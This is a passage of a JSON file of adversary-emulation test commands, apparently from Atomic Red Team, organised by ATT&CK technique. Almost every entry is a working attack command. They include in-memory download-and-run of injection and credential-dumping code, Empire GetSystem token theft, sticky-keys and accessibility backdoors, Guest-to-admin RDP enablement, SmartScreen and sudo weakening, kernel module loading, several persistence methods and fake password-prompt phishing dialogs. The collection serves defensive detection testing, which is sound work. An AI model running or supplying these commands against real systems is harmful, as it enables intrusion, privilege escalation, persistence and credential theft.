         "command": "Start-Process \"971b85_RedInjection.exe\"; Start-Sleep -Seconds 7; Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force"
      },
      {
         "technique_id": "T1055.002",
         "technique_name": "Process Injection: Portable Executable Injection",
         "tactic": "defense-evasion",
         "description": "Leverage Mavinject (signed binary) for DLL injection",
         "command": "$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll\n"
      },
      {
         "technique_id": "T1055.002",
         "technique_name": "Process Injection: Portable Executable Injection",
         "tactic": "defense-evasion",
         "description": "Injects sandcat DLL into an available process",
         "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n"
      },
      {
         "technique_id": "T1055.002",
         "technique_name": "Process Injection: Portable Executable Injection",
         "tactic": "credential-access",
         "description": "Injects cred dumper exe into an available process",
         "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"file\",\"debugger.dll\");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose"
      }
   ],
   "T1078.001": [
      {
         "technique_id": "T1078.001",
         "technique_name": "Valid Accounts: Default Accounts",
         "tactic": "multiple",
         "description": "After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,\nand desktop will allow multiple RDP connections.\n",
         "command": "net user #{guest_user} /active:yes && net user #{guest_user} #{guest_password} && net localgroup #{local_admin_group} #{guest_user} /add && net localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add && reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f && reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f"
      },
      {
         "technique_id": "T1078.001",
         "technique_name": "Valid Accounts: Default Accounts",
         "tactic": "multiple",
         "description": "The Adversaries can activate the default Guest user. The guest account is inactivated by default\n",
         "command": "net user guest /active:yes"
      },
      {
         "technique_id": "T1078.001",
         "technique_name": "Valid Accounts: Default Accounts",
         "tactic": "multiple",
         "description": "This test enables the guest account on macOS using sysadminctl utility.",
         "command": "sudo sysadminctl -guestAccount on"
      }
   ],
   "T1055.003": [
      {
         "technique_id": "T1055.003",
         "technique_name": "Thread Execution Hijacking",
         "tactic": "multiple",
         "description": "This test injects a MessageBox shellcode generated by msfvenom in Notepad.exe using Thread Execution Hijacking. When successful, a message box will appear with the \"Atomic Red Team\" caption after one or two seconds. ",
         "command": "$notepad = Start-Process notepad -passthru; Start-Process \"C:\\Users\\puma-4\\Desktop\\InjectContext.exe\"; Start-Sleep -Seconds 5; Stop-Process $notepad.id"
      }
   ],
   "T1484.001": [
      {
         "technique_id": "T1484.001",
         "technique_name": "Domain Policy Modification: Group Policy Modification",
         "tactic": "multiple",
         "description": "An adversary can modify the group policy settings.\n",
         "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /t REG_SZ /d Block /f"
      },
      {
         "technique_id": "T1484.001",
         "technique_name": "Domain Policy Modification: Group Policy Modification",
         "tactic": "multiple",
         "description": "An adversary modifies group policy settings\n",
         "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force"
      }
   ],
   "T1548.003": [
      {
         "technique_id": "T1548.003",
         "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
         "tactic": "multiple",
         "description": "Common Sudo enumeration methods.\n",
         "command": "sudo -l      ; sudo cat /etc/sudoers; sudo vim /etc/sudoers"
      },
      {
         "technique_id": "T1548.003",
         "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
         "tactic": "multiple",
         "description": "Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.\n",
         "command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"; sudo visudo -c -f /etc/sudoers"
      },
      {
         "technique_id": "T1548.003",
         "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
         "tactic": "multiple",
         "description": "Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.\n",
         "command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers; sudo visudo -c -f /etc/sudoers"
      }
   ],
   "T1547.006": [
      {
         "technique_id": "T1547.006",
         "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
         "tactic": "multiple",
         "description": "This test uses the insmod command to load a kernel module for Linux.\n",
         "command": "sudo insmod /tmp/T1547.006/T1547006.ko"
      },
      {
         "technique_id": "T1547.006",
         "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
         "tactic": "multiple",
         "description": "This test uses the kextload and kmutil commands to load and unload a MacOS kernel module.\n",
         "command": "set -x; sudo kextload /Library/Extensions/SoftRAID.kext; kextstat 2>/dev/null | grep SoftRAID; sudo kextunload /Library/Extensions/SoftRAID.kext; sudo kmutil load -p /Library/Extensions/SoftRAID.kext; kextstat 2>/dev/null | grep SoftRAID; sudo kmutil unload -p /Library/Extensions/SoftRAID.kext"
      },
      {
         "technique_id": "T1547.006",
         "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
         "tactic": "multiple",
         "description": "The following Atomic Test will write an file, comadmin.dat, to disk. From the report, Snake's installer drops the kernel driver and a custom DLL which is used to load the driver into a\nsingle AES encrypted file on disk. Typically, this file is named \u201ccomadmin.dat\u201d and is stored in the %windows%\\system32\\Com directory. \nThis Atomic Test will write a hardcoded named file to disk in the com directory named comadmin.dat.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
         "command": "$examplePath = Join-Path $env:windir \"system32\\Com\"; if (-not (Test-Path $examplePath)) { New-Item -ItemType Directory -Path $examplePath | Out-Null }; $exampleName = \"comadmin.dat\"; $exampleFullPath = Join-Path $examplePath $exampleName; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); [System.IO.File]::WriteAllBytes($exampleFullPath, $randomBytes)"
      },
      {
         "technique_id": "T1547.006",
         "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
         "tactic": "multiple",
         "description": "This test uses the IOKit API to load a kernel module for macOS.\nHarcoded to use SoftRAID kext\n",
         "command": "sudo /tmp/T1547006_iokit_loader; kextstat 2>/dev/null | grep SoftRAID; sudo kextunload /Library/Extensions/SoftRAID.kext"
      }
   ],
   "T1574.002": [
      {
         "technique_id": "T1574.002",
         "technique_name": "Hijack Execution Flow: DLL Side-Loading",
         "tactic": "multiple",
         "description": "Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)\n",
         "command": "set DOTNET_STARTUP_HOOKS=\"80410d_preloader.dll\" && dotnet -h > nul && echo."
      },
      {
         "technique_id": "T1574.002",
         "technique_name": "Hijack Execution Flow: DLL Side-Loading",
         "tactic": "multiple",
         "description": "GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.\nUpon execution, calc.exe will be opened.\n",
         "command": "\"67baa5_GUP.exe\""
      }
   ],
   "T1546.007": [
      {
         "technique_id": "T1546.007",
         "technique_name": "Event Triggered Execution: Netsh Helper DLL",
         "tactic": "multiple",
         "description": "You can register a \"helper dll\" with Netsh as a persistance mechanism. The code in the dll is executed every time netsh.exe is called.\nThe NetshHelper.dll provided with the atomic will simply launch notepad when netsh.exe is run.\n\n[Blog](https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html)\n[Sample DLL code](https://github.com/outflanknl/NetshHelperBeacon)\n",
         "command": "netsh.exe add helper \"08497f_NetshHelper.dll\" && taskkill /im notepad.exe /t /f > NUL 2>&1"
      }
   ],
   "T1056.002": [
      {
         "technique_id": "T1056.002",
         "technique_name": "Input Capture: GUI Input Capture",
         "tactic": "multiple",
         "description": "Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.\n\nReference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py\n",
         "command": "$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName); write-warning $cred.GetNetworkCredential().Password"
      },
      {
         "technique_id": "T1056.002",
         "technique_name": "Input Capture: GUI Input Capture",
         "tactic": "multiple",
         "description": "Prompt user for password without requiring permissions to send Apple events to System Settings.\nhttps://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/\n",
         "command": "PWD_SPOOF=$(osascript -e 'display dialog \"To perform a security update MacOS needs your passphrase.\" with title \"MacOS Security Update\" default answer \"\" with icon stop with hidden answer'); echo $PWD_SPOOF"
      },
      {
         "technique_id": "T1056.002",
         "technique_name": "Input Capture: GUI Input Capture",
         "tactic": "multiple",
         "description": "Prompt User for Password (Local Phishing)\nReference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html\n",
         "command": "osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" & return & return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"'"
      }
   ],
   "T1053.007": [
      {
         "technique_id": "T1053.007",
         "technique_name": "Kubernetes Cronjob",
         "tactic": "multiple",
         "description": "Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. Attackers may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\n",
         "command": "kubectl create -f src/cronjob.yaml -n default"
      },
      {
         "technique_id": "T1053.007",
         "technique_name": "Kubernetes Cronjob",
         "tactic": "multiple",
         "description": "Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. Attackers may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\n",
         "command": "kubectl get cronjobs -n default"
      }
   ],
   "T1134.001": [
      {
         "technique_id": "T1134.001",
         "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
         "tactic": "multiple",
         "description": "https://github.com/BeichenDream/BadPotato\nPrivilege escalation using named pipe connections",
         "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"; Start-Process .\\BadPotato.exe notepad.exe; Start-Sleep -Second 20; Stop-Process -Name \"notepad\" -force -erroraction silentlycontinue; Stop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue"
      },
      {
         "technique_id": "T1134.001",
         "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
         "tactic": "multiple",
         "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose"
      },
      {
         "technique_id": "T1134.001",
         "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
         "tactic": "multiple",
         "description": "Launches the NSudo executable for a short period of time and then exits.\nNSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.",
         "command": "Start-Process \"C:\\Users\\puma-4\\Desktop\\NSudoLG.exe\" -Argument \"-U:T -P:E cmd\"; Start-Sleep -Second 5; Stop-Process -Name \"cmd\" -force -erroraction silentlycontinue"
      },
      {
         "technique_id": "T1134.001",
         "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
         "tactic": "multiple",
         "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose"
      }
   ],
   "T1546.001": [
      {
         "technique_id": "T1546.001",
         "technique_name": "Event Triggered Execution: Change Default File Association",
         "tactic": "multiple",
         "description": "Change Default File Association From cmd.exe of hta to notepad.\n\nUpon successful execution, cmd.exe will change the file association of .hta to notepad.exe. \n",
         "command": "assoc .hta=txtfile"
      }
   ],
   "T1547.014": [
      {
         "technique_id": "T1547.014",
         "technique_name": "Active Setup",
         "tactic": "multiple",
         "description": "This test will add a StubPath entry to the Active Setup native registry key associated with 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) \nSaid key doesn't have a StubPath value by default, by adding one it will launch calc by forcing to run active setup using runonce.exe /AlternateShellStartup. \nWithout the last command it will normally run on next user logon. Note: this test will only run once successfully if no cleanup command is run in between test.\n",
         "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" \"StubPath\" \"#{payload}\" -Force; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup"
      },
      {
         "technique_id": "T1547.014",
         "technique_name": "Active Setup",
         "tactic": "multiple",
         "description": "This test will decrease the version number of the 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) registry key for the current user, \nwhich will force the StubPath payload (if set) to execute.\n",
         "command": "Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Value \"0,0,0,0\"; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup"
      },
      {
         "technique_id": "T1547.014",
         "technique_name": "Active Setup",
         "tactic": "multiple",
         "description": "This test will create an \"atomic_test\" key under 'HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components' to launch calc by configuring an active setup executable and \nforcing to run active setup using the \"runonce.exe /AlternateShellStartup\" command. \nWithout the \"runonce.exe /AlternateShellStartup\" command it would run during the next logon for each user.\n\nNote: If you logout before running the cleanup command, you will be required to go through the OOBE (out-of-box experience) setup sequence to log back in. \nThe payload will only run once unless the cleanup command is run in between tests.\n\n[Active Setup Explained](https://helgeklein.com/blog/active-setup-explained/)\n",
         "command": "New-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" -Name \"atomic_test\" -Force; Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"(Default)\" \"ART TEST\" -Force; Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"StubPath\" \"#{payload}\" -Force ; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup"
      }
   ],
   "T1546.008": [
      {
         "technique_id": "T1546.008",
         "technique_name": "Event Triggered Execution: Accessibility Features",
         "tactic": "multiple",
         "description": "Replace sticky keys binary (sethc.exe) with cmd.exe\n",
         "command": "IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd ) && takeown /F C:\\Windows\\System32\\sethc.exe /A && icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t && copy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe"
      },
      {
         "technique_id": "T1546.008",
         "technique_name": "Event Triggered Execution: Accessibility Features",
         "tactic": "multiple",
         "description": "Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.\n",
         "command": "IF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd ) && takeown /F %windir%\\System32\\osk.exe /A && icacls %windir%\\System32\\osk.exe /grant Administrators:F /t && del %windir%\\System32\\osk.exe && mklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe"
      },
      {
         "technique_id": "T1546.008",
         "technique_name": "Event Triggered Execution: Accessibility Features",
         "tactic": "multiple",
         "description": "Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.\nUpon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.\n",
         "command": "$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\"); $Name = \"Debugger\"; $Value = \"C:\\windows\\system32\\cmd.exe\"; Foreach ($item in $input_table){;   $item = $item.trim();   $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\";   IF(!(Test-Path $registryPath));   {;     New-Item -Path $registryPath -Force;     New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force;   };   ELSE;   {;     New-ItemProperty -Path $registryPath -Name $name -Value $Value;   }; }"
      }
   ],
   "T1547.009": [
      {
         "technique_id": "T1547.009",
         "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification",
         "tactic": "multiple",
         "description": "LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nto view the new shortcut.\n",
         "command": "$Shell = New-Object -ComObject (\"WScript.Shell\"); $ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\"); $ShortCut.TargetPath=\"cmd.exe\"; $ShortCut.WorkingDirectory = \"C:\\Windows\\System32\"; $ShortCut.WindowStyle = 1; $ShortCut.Description = \"T1547.009.\"; $ShortCut.Save(); $Shell = New-Object -ComObject (\"WScript.Shell\"); $ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\"); $ShortCut.TargetPath=\"cmd.exe\"; $ShortCut.WorkingDirectory = \"C:\\Windows\\System32\"; $ShortCut.WindowStyle = 1; $ShortCut.Description = \"T1547.009.\"; $ShortCut.Save()"
      },
      {
         "technique_id": "T1547.009",
         "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification",
         "tactic": "multiple",
         "description": "This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;\ngci -path \"C:\\Users\" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern \"exe\" | FL.\nUpon execution, calc.exe will be launched.\n",
         "command": "echo [InternetShortcut] > %temp%\\T1547.009_modified_shortcut.url && echo URL=C:\\windows\\system32\\calc.exe >> %temp%\\T1547.009_modified_shortcut.url && %temp%\\T1547.009_modified_shortcut.url"
      }
   ],
   "T1546.011": [
      {
         "technique_id": "T1546.011",
         "technique_name": "Event Triggered Execution: Application Shimming",
         "tactic": "multiple",
         "description": "Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing\nthe registry keys that were created. These keys can also be viewed using the Registry Editor.\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n",
         "command": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"; New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\""
      },
      {
         "technique_id": "T1546.011",
         "technique_name": "Event Triggered Execution: Application Shimming",
         "tactic": "multiple",
         "description": "Install a shim database. This technique is used for privilege escalation and bypassing user access control.\nUpon execution, \"Installation of AtomicShim complete.\" will be displayed. To verify the shim behavior, run \nthe AtomicTest.exe from the <PathToAtomicsFolder>\\\\T1546.011\\\\bin directory. You should see a message box appear\nwith \"Atomic Shim DLL Test!\" as defined in the AtomicTest.dll. To better understand what is happening, review\nthe source code files is the <PathToAtomicsFolder>\\\\T1546.011\\\\src directory.\n",
         "command": "sdbinst.exe \"729b9b_AtomicShimx86.sdb\""
      },
      {
         "technique_id": "T1546.011",
         "technique_name": "Event Triggered Execution: Application Shimming",
         "tactic": "multiple",
         "description": "Upon execution, check the \"C:\\Windows\\apppatch\\Custom\\\" folder for the new shim database\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n",
         "command": "Copy-Item \"C:\\Users\\puma-4\\Desktop\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb; Copy-Item \"C:\\Users\\puma-4\\Desktop\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb"
      }
   ],
   "T1055.001": [
      {
         "technique_id": "T1055.001",
         "technique_name": "Process Injection: Dynamic-link Library Injection",
         "tactic": "multiple",
         "description": "Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn",
         "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')"
      },
      {
         "technique_id": "T1055.001",
         "technique_name": "Process Injection: Dynamic-link Library Injection",
         "tactic": "multiple",
         "description": "Windows 10 Utility To Inject DLLS.\n\nUpon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.\nWith default arguments, expect to see a MessageBox, with notepad's icon in taskbar.\n",
         "command": "$mypid =; mavinject $mypid /INJECTRUNNING \"#{dll_payload}\"; Stop-Process -processname notepad"
      },
      {
         "technique_id": "T1055.001",
         "technique_name": "Process Injection: Dynamic-link Library Injection",
         "tactic": "defense-evasion",
         "description": "Leverage odbcconf for DLL injection",
         "command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}\n"
      }
   ],
   "T1547.003": [
      {
         "technique_id": "T1547.003",
         "technique_name": "Time Providers",
         "tactic": "multiple",
         "description": "Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
         "command": "net stop w32time; Copy-Item \"C:\\Users\\puma-4\\Desktop\\T1547_003_AtomicTest.dll\" C:\\Users\\Public\\T1547_003_AtomicTest.dll; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\T1547_003_AtomicTest.dll\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f; net start w32time"
      },
      {
         "technique_id": "T1547.003",
         "technique_name": "Time Providers",
         "tactic": "multiple",
         "description": "Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
         "command": "net stop w32time; Copy-Item \"C:\\Users\\puma-4\\Desktop\\T1547_003_AtomicTest.dll\" C:\\Users\\Public\\T1547_003_AtomicTest.dll; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\T1547_003_AtomicTest.dll\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f; net start w32time"
      }
   ],
   "T1543.001": [
      {
         "technique_id": "T1543.001",
         "technique_name": "Create or Modify System Process: Launch Agent",
         "tactic": "multiple",
         "description": "Create a plist and execute it\n",
         "command": "if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi; sudo cp a42d6f_atomicredteam_T1543_001.plist ~/Library/LaunchAgents/com.atomicredteam.plist; sudo launchctl load -w ~/Library/LaunchAgents/com.atomicredteam.plist"
      },
      {
         "technique_id": "T1543.001",
         "technique_name": "Create or Modify System Process: Launch Agent",
         "tactic": "multiple",
         "description": "This test adds persistence via a plist to execute via the macOS Event Monitor Daemon. \n",
         "command": "sudo cp; sudo touch /private/var/db/emondClients/#{empty_file}"
      }
   ],
   "T1574.012": [
      {
         "technique_id": "T1574.012",
         "technique_name": "Hijack Execution Flow: COR_PROFILER",
         "tactic": "multiple",
         "description": "Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).\nThe unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.\nAdditionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.\nIf the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,\nthe notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
